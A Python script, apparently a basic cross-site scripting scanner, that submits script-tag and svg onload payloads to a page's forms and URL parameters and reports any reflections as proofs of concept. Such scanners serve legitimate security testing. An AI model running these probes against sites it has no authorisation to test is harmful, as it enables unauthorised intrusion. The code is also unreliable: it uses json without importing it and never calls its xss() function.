#   Usage: python3 XSS_scanner.py http://testphp.vulnweb.com/

import requests
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import sys


def get_all_forms(url):
    soup = bs(requests.get(url, verify=False, timeout=(10, 27)).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data, verify=False, timeout=(10, 27))
    else:
        return requests.get(target_url, params=data, verify=False, timeout=(10, 27))


def scan_xss(url):
    forms = get_all_forms(url)
    print(f"Detected {len(forms)} forms.")
    js_payload = "<Script>alert('XSSED')</scripT>"
    is_vulnerable = False

    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_payload).content.decode()
        if js_payload in content:
            print(f"XSS Detected on {url}")
            print(f"Form details:")
            print(json.dumps(dict(form_details), sort_keys=True, indent=4))
            is_vulnerable = True
    return is_vulnerable


def xss(url):
    paydone = []
    payloads = ['injectest','/inject','//inject//','<inject','(inject','"inject','<script>alert("inject")</script>']
    print(colored("Performing Blind XSS Checks","green"))
    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pl in payloads:
        urlte = urlt + pl
        re = requests.get(urlte).text
        if pl in re:
            paydone.append(pl)
        else:
            pass
    url1 = urlt + '%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb'
    req1 = requests.get(url1).text
    if "'>inject<svg/onload=confirm(/inject/)>web" in req1:
        paydone.append('%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb')
    else:
        pass
    url2 = urlt + '%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req2 = requests.get(url2).text
    if '<script>alert("inject")</script>' in req2:
        paydone.append('%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass
    url3 = urlt + '%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req3 = requests.get(url3).text
    if '<script>alert("inject")</script>' in req3:
        paydone.append('%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass
    if len(paydone) == 0:
        print("No XSS Vulnerability Identified")
    else:
        print("\t",len(paydone),"Payloads were found.")
        for p in paydone:
            print("\tPayload found!")
            print("\tPayload:",p)
            print("\tPOC:",urlt+p)

 
#url = sys.argv[1]
#print(scan_xss(url))